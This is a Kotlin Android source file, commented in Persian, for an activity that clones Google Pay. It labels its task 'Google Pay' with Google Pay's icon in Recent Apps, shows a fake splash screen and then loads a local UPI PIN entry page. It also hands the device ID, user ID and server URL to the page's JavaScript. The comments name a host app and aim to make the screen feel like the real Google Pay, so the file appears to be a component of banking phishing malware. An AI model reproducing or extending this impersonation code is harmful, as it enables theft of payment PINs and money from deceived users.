package com.example.test

import android.app.ActivityManager
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.example.test.utils.DeviceInfoHelper
import com.example.test.ServerConfig

/**
 * ⭐ GPayCloneActivity - کلون Google Pay (مثل یک برنامه جداگانه)
 * 
 * این Activity با taskAffinity جداگانه باز میشه که باعث میشه:
 * - مثل یک برنامه جداگانه در Recent Apps نمایش داده بشه
 * - Task جداگانه داشته باشه
 * - تجربه کاربری مثل باز کردن Google Pay باشه
 * - ابتدا splash screen نمایش میده، بعد صفحه پرداخت
 */
class GPayCloneActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var deviceId: String
    private lateinit var appConfig: AppConfig

    companion object {
        private const val TAG = "GPayCloneActivity"
        private const val SPLASH_DELAY_MS = 2500L // 2.5 ثانیه
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // ⭐ Fullscreen mode
        enableFullscreen()
        
        // ⭐ Load config (باید اول load بشه برای استفاده در setTaskDescriptionForRecentApps)
        appConfig = AppConfig.load(this)
        deviceId = DeviceInfoHelper.getDeviceId(this)
        
        // ⭐ Initialize ServerConfig
        ServerConfig.initialize(this)
        
        // ⭐ تنظیم Task Description برای نمایش در Recent Apps
        setTaskDescriptionForRecentApps()
        
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 GPay CLONE ACTIVITY CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "📱 App Type: ${appConfig.appType}")
        Log.d(TAG, "════════════════════════════════════════")
        
        // ⭐ Create WebView
        webView = createWebView()
        setContentView(webView)
        
        // ⭐ ابتدا splash screen نمایش بده، بعد صفحه پرداخت
        loadSplashScreen()
    }

    /**
     * ⭐ تنظیم Task Description برای نمایش در Recent Apps
     * اسم: "اسم برنامه - Google Pay" (مثلا "mParivahan - Google Pay")
     */
    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // ⭐ فقط اسم پرداخت (بدون اسم برنامه)
            val taskName = "Google Pay"
            
            // ⭐ خواندن ایکون از assets
            try {
                val iconStream = assets.open("google-pay-icon.png")
                val iconBitmap = BitmapFactory.decodeStream(iconStream)
                iconStream.close()
                
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    iconBitmap,
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
                Log.d(TAG, "✅ Task description set: $taskName")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to load icon from assets", e)
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
            }
        }
    }

    /**
     * ⭐ Fullscreen mode
     */
    private fun enableFullscreen() {
        supportActionBar?.hide()
        
        WindowCompat.setDecorFitsSystemWindows(window, true)
        
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }
        
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    /**
     * ⭐ ساخت WebView برای نمایش صفحات پرداخت
     */
    private fun createWebView(): WebView {
        val webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        // ⭐ WebViewClient برای مدیریت navigation
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ Page loaded: $url")
                
                // ⭐ اگر final.html لود شد، کلون رو ببند و به MainActivity برگرد
                if (url != null && url.contains("final.html", ignoreCase = true)) {
                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "✅ PAYMENT SUCCESS - Closing clone and returning to main app")
                    Log.d(TAG, "════════════════════════════════════════")
                    
                    // ⭐ یک تأخیر کوتاه برای نمایش final.html
                    Handler(Looper.getMainLooper()).postDelayed({
                        // ⭐ برگشت به MainActivity
                        val intent = Intent(this@GPayCloneActivity, MainActivity::class.java)
                        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
                        startActivity(intent)
                        
                        // ⭐ بستن کلون
                        finish()
                    }, 2000) // 2 ثانیه برای نمایش پیام موفقیت
                    
                    return
                }
                
                // ⭐ اعمال رنگ status bar از meta tag
                applyThemeColorFromPage()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        // ⭐ JavaScript Interface
        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
        }, "Android")

        return webView
    }

    /**
     * ⭐ مدیریت navigation در کلون
     * تمام صفحات مربوط به پرداخت در همین Activity لود می‌شن
     */
    private fun handleUrlNavigation(url: String): Boolean {
        Log.d(TAG, "🔗 Navigation request: $url")
        
        // ⭐ اگر URL خارج از assets هست، در همین WebView لود کن
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false
        }
        
        // ⭐ اگر فایل HTML داخلی هست، در همین Activity لود کن
        if (url.endsWith(".html")) {
            val fullUrl = if (url.startsWith("file://")) {
                url
            } else if (url.startsWith("/")) {
                "file:///android_asset${url}"
            } else {
                "file:///android_asset/$url"
            }
            
            Log.d(TAG, "📄 Loading page: $fullUrl")
            webView.loadUrl(fullUrl)
            return true
        }
        
        return false
    }

    /**
     * ⭐ لود کردن splash screen Google Pay
     */
    private fun loadSplashScreen() {
        val splashPath = "file:///android_asset/googlepay-splash.html"
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📄 LOADING GOOGLE PAY SPLASH SCREEN")
        Log.d(TAG, "📄 Splash Path: $splashPath")
        Log.d(TAG, "════════════════════════════════════════")
        webView.loadUrl(splashPath)
        // ⭐ Splash screen خودش بعد از 2.5 ثانیه به upi-pin.html میره
    }

    /**
     * ⭐ اعمال رنگ status bar از meta tag صفحه
     */
    private fun applyThemeColorFromPage() {
        webView.evaluateJavascript(
            """
            (function() {
                try {
                    var metaTheme = document.querySelector('meta[name="theme-color"]');
                    if (metaTheme) {
                        return metaTheme.getAttribute('content');
                    }
                    return null;
                } catch(e) {
                    return null;
                }
            })();
            """.trimIndent()
        ) { color ->
            if (color != null && color != "null") {
                val colorValue = color.replace("\"", "")
                try {
                    val parsedColor = android.graphics.Color.parseColor(colorValue)
                    runOnUiThread {
                        window.statusBarColor = parsedColor
                        window.navigationBarColor = parsedColor
                        Log.d(TAG, "🎨 Status bar color set to: $colorValue")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
                }
            }
        }
    }

    /**
     * ⭐ مدیریت دکمه برگشت
     */
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            // ⭐ بستن Activity
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 GPayCloneActivity destroyed")
        
        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
}

